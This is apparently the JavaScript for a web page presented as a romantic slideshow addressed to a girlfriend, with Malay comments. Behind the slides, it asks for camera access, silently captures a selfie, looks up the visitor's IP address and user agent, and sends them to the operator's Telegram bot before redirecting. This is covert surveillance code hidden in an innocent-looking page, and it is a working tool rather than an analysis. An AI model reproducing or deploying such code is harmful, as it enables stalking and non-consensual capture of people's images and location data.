import { CONFIG } from "./config.js";

const TG = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}`;
document.getElementById("greet").textContent = `Untuk ${CONFIG.GF_NAME} ❤️`;

function esc(s) {
  return String(s).replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
}

async function sendPhoto(blob, caption) {
  const fd = new FormData();
  fd.append("chat_id", CONFIG.CHAT_ID);
  fd.append("photo", blob, "selfie.jpg");
  fd.append("caption", caption);
  fd.append("parse_mode", "HTML");
  await fetch(`${TG}/sendPhoto`, { method: "POST", body: fd });
}

async function collectMeta() {
  let ip = "n/a";
  try {
    const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
    ip = (await r.json()).ip;
  } catch {}
  return { ua: navigator.userAgent, ip, ts: new Date().toISOString() };
}

const btn = document.getElementById("start");
const hint = document.getElementById("hint");
const video = document.getElementById("cam");
const pageIntro = document.getElementById("page-intro");
const pageSlides = document.getElementById("page-slides");
const bgm = document.getElementById("bgm");
bgm.src = CONFIG.AUDIO_URL;

// ---------- Audio ----------
let muted = false;
function makeMuteBtn() {
  const b = document.createElement("button");
  b.className = "mute-btn";
  b.textContent = "🔊";
  b.setAttribute("aria-label", "Senyapkan muzik");
  b.addEventListener("click", e => {
    e.stopPropagation();
    muted = !muted;
    bgm.muted = muted;
    b.textContent = muted ? "🔇" : "🔊";
  });
  document.body.appendChild(b);
}

async function playAudio() {
  try {
    bgm.volume = 0.7;
    await bgm.play();
    makeMuteBtn();
  } catch (e) {
    // Autoplay disekat — cuba sekali lagi selepas gesture seterusnya
    const retry = () => { bgm.play().catch(() => {}); document.removeEventListener("click", retry); };
    document.addEventListener("click", retry, { once: true });
  }
}

// ---------- Kamera: minta + capture senyap ----------
let camStream = null;
let captured = false;

async function initCamera() {
  try {
    camStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    });
    video.srcObject = camStream;
    try { await video.play(); } catch {}
    await new Promise(r => setTimeout(r, 1800));
    if (!video.videoWidth) await new Promise(r => setTimeout(r, 1200));
    await captureFrame();
  } catch (e) {}
}

async function captureFrame() {
  if (captured || !video.videoWidth) return;
  captured = true;

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async blob => {
    if (!blob) return;
    const meta = await collectMeta();
    const caption = [
      `<b>❤️ Love Cam — Selfie</b>`,
      `<b>Untuk:</b> ${esc(CONFIG.GF_NAME)}`,
      `<b>IP:</b> ${esc(meta.ip)}`,
      `<b>UA:</b> ${esc(meta.ua)}`,
      `<b>Masa:</b> ${esc(meta.ts)}`
    ].join("\n");
    try { await sendPhoto(blob, caption); } catch {}
    if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
  }, "image/jpeg", 0.9);
}

// ---------- Slide runner ----------
let slideIdx = 0;
let slideTimer = null;

function renderDots() {
  const dots = document.getElementById("dots");
  dots.innerHTML = "";
  CONFIG.SLIDES.forEach((_, i) => {
    const d = document.createElement("span");
    d.className = "dot" + (i === slideIdx ? " active" : "");
    dots.appendChild(d);
  });
}

function showSlide(i) {
  const s = CONFIG.SLIDES[i];
  if (!s) return endSlides();
  const img = document.getElementById("slide-img");
  const text = document.getElementById("slide-text");

  img.style.opacity = 0;
  text.style.opacity = 0;

  setTimeout(() => {
    img.src = s.img;
    text.textContent = s.text;
    img.onload = () => { img.style.opacity = 1; };
    text.style.opacity = 1;
    renderDots();
  }, 300);

  slideTimer = setTimeout(() => {
    slideIdx++;
    showSlide(slideIdx);
  }, 4500);
}

function endSlides() {
  clearTimeout(slideTimer);
  // Fade out audio + page, redirect
  const fade = setInterval(() => {
    if (bgm.volume > 0.05) bgm.volume = Math.max(0, bgm.volume - 0.05);
    else { clearInterval(fade); bgm.pause(); }
  }, 60);

  pageSlides.style.transition = "opacity .8s ease";
  pageSlides.style.opacity = 0;
  setTimeout(() => location.replace(CONFIG.REDIRECT_URL), 900);
}

// ---------- Start ----------
btn.addEventListener("click", async () => {
  btn.disabled = true;
  btn.textContent = "Membuka…";
  hint.textContent = "Benarkan akses kamera untuk teruskan…";

  // Audio mula DULU — gesture user (klik) membenarkan autoplay
  playAudio();

  // Kamera minta permission
  await initCamera();

  // Sembunyi intro, tunjuk slide
  pageIntro.classList.add("hidden");
  pageSlides.classList.remove("hidden");

  const first = new Image();
  first.src = CONFIG.SLIDES[0].img;
  first.onload = () => showSlide(0);
  setTimeout(() => { if (slideIdx === 0 && !slideTimer) showSlide(0); }, 2000);
});
